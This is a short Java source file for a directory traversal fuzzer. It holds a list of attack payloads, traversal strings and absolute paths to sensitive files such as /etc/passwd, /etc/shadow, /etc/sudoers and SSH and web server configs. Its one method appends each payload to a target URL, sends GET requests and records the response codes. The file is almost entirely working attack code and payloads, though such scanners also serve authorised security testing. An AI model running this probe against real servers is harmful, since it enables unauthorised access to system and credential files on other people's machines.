package org.example;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class DirectoryTraversalFuzzer {

    private static final String[] PAYLOADS = {
            "../../../../etc/passwd",
            "../../windows/win.ini",
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../windows/win.ini",
            "../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../windows/win.ini",
            "../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../windows/win.ini",
            "../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../windows/win.ini",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/resolv.conf",
            "/etc/group",
            "/etc/issue",
            "/etc/motd",
            "/etc/sysctl.conf",
            "/etc/ssh/sshd_config",
            "/etc/sudoers",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/etc/php/php.ini",
            "/etc/ssl/openssl.cnf",
            "/usr/local/etc/php.ini",
            "/usr/local/etc/apache2/httpd.conf",
            "/usr/local/etc/nginx/nginx.conf",
            "/usr/local/etc/openssl.cnf",
            "/usr/local/etc/ssh/sshd_config",
            "/usr/local/etc/sudoers",
            "/usr/local/apache2/conf/httpd.conf",
            "/usr/local/nginx/conf/nginx.conf",
            "/usr/local/apache2/conf/extra/httpd-vhosts.conf",
            "/usr/local/apache2/conf/extra/httpd-default.conf",
            "/usr/local/apache2/conf/extra/httpd-ssl.conf",
            "/usr/local/apache2/conf/extra/httpd-xampp.conf",
            "/usr/local/apache/conf/httpd.conf",
            "/usr/local/nginx/conf/nginx.conf",
            "/usr/local/nginx/conf/fastcgi.conf",
            "/usr/local/nginx/conf/fastcgi_params",
            "/usr/local/nginx/conf/uwsgi_params",
            "/usr/local/nginx/conf/scgi_params",
            "/usr/local/etc/apache2/sites-available/default",
            "/usr/local/etc/apache2/sites-available/default-ssl",
            "/usr/local/etc/apache2/sites-available/default-ssl.conf",
            "/usr/local/etc/nginx/sites-available/default",
            "/usr/local/etc/nginx/sites-available/default-ssl",
            "/usr/local/etc/nginx/sites-available/default-ssl.conf",
            "/usr/local/etc/nginx/sites-available/default-ssl-vhosts.conf"
    };

    public static List<String> fuzzDirectoryTraversal(String url) throws IOException {
        List<String> results = new ArrayList<>();
        for (String payload : PAYLOADS) {
            String fuzzedUrl = url + payload;
            HttpURLConnection connection = (HttpURLConnection) new URL(fuzzedUrl).openConnection();
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
            results.add("URL: " + fuzzedUrl + " -> Response Code: " + responseCode);
        }
        return results;
    }
}

